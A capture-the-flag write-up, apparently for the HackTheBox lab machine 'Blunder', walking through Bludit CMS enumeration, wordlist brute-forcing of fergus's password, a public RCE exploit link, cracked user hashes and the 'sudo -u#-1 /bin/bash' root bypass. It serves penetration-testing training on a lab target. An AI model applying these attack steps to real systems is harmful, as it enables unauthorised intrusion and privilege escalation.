1, Recon
	80/tcp http `Blunder | A blunder of interesting facts`
This so tricky, only one port is open.

And by basically enumerate we find the `/admin` the login page.
![](images/Pasted%20image%2020240910093858.png)
Check all of them, only the `/admin` would be useful for us, but others could not find anything.

we have get the version of this
`[http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2](view-source:http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2)"`
From the http-title, we have known this is a Blunder CMS.
So maybe we can find the default credit or guess some existed exploits.
In the exploit-db.
`Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass`
We have known there must be a username `admin` as the default administrator.
And even it could be exploited by Metasploit
`Bludit Directory Traversal Image File Upload Vulnerability`

and there is another file
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
There is a username `fergus`
In this place, before we use rockyou.txt, we can make a wordlist.
`cewl http://10.10.10.191 > wordlist`
And we successfully get the credit.
`fergus:RolandDeschain`

When we login, we can try the RCE exploit.
`https://github.com/0xConstant/CVE-2019-16113.git`

Then we can get the www-data shell

2, get the user shell.
Enumerate the directory, there is a `users.php` file
```
"admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
```
We can try to crack it.
And there is also another version of `bludit-3.10.0a` and we can get another credit from that
```
"admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",

```

In this place, we can check the `/etc/passwd`
```
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
temp:x:1002:1002:,,,:/home/temp:/bin/bash
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
```

So the hugo would be invalid user and let's crack it.
`faca404fd5c0a31cf1897b823c695c85cffeb98d	sha1	Password120`

Let's su hugo.
And when we check the `sudo -l`
```
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
That was so tricky, and  we can check the sudo version

```
sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```
There is a exploit in exploit-db:
`sudo 1.8.27 - Security Bypass`
`sudo -u#-1 /bin/bash`
Then we can get the root shell.
